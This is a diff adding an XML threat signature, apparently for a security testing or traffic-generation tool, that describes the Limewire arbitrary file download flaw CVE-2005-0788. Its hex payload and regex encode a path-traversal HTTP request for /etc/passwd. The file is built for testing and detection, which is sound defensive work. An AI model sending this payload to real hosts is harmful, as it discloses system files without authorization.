@@ -1,0 +1,79 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Limewire Arbitrary File Download"/>
+    <EngDesc display="true" value="This threat attempts to download an arbitrary file from a Limewire host. Limewire is a file sharing application, and uses the Gnutella protocol to share information.  Limewire typically listens on port 6346.  This particular threat will attempt to download the contents of /etc/passwd."/>
+    <Intent display="true">
+      <item value="Implementation_Exploitation"/>
+      <item value="Unauthorized_Access"/>
+    </Intent>
+    <Protocol display="true" value="Gnutella"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Limewire"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Limewire"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Limewire_4.1.2"/>
+      <item value="Limewire_4.5.6"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.securityfocus.com/bid/12802"/>
+    <CVEID display="true" value="CVE-2005-0788"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="14671"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="00000102fc5971fa00c000a80001003c76e38c3e"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="none"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632726698612343750"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X47\X45\X54\X20\X2F\X67\X6E\X75\X74\X65\X6C\X6C\X61\X2F\X72\X65\X73\X2F\X2F\X2F\X65\X74\X63\X2F\X70\X61\X73\X73\X77\X64\X20\X48\X54\X54\X50\X2F\X31\X2E\X31\X0A\X20\X55\X73\X65\X72\X2D\X41\X67\X65\X6E\X74\X3A\X20\X49\X2D\X41\X4D\X2D\X41\X4E\X2D\X41\X54\X54\X41\X43\X4B\X45\X52\X2F\X31\X2E\X30\X0A\X0A\X48\X6F\X73\X74\X3A\X20\X30\X2E\X30\X2E\X30\X2E\X30\X3A\X30\X0A\X20\X41\X63\X63\X65\X70\X74\X3A\X20\X2A\X2F\X2A\X0A\X20\X43\X6F\X6E\X6E\X65\X63\X74\X69\X6F\X6E\X3A\X20\X4B\X65\X65\X70\X2D\X41\X6C\X69\X76\X65"/>
+    <Created value="1139462166" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
+    <NamedVar name="GnutelladestPort" type="ImperfectControls.Port" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026, 65535)" destPort="$GnutelladestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F676E7574656C6C612F7265732F2F2F6574632F70617373776420485454502F312E310A20557365722D4167656E743A20492D414D2D414E2D41545441434B45522F312E300A0A486F73743A20302E302E302E303A300A204163636570743A202A2F2A0A20436F6E6E656374696F6E3A204B6565702D416C697665" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
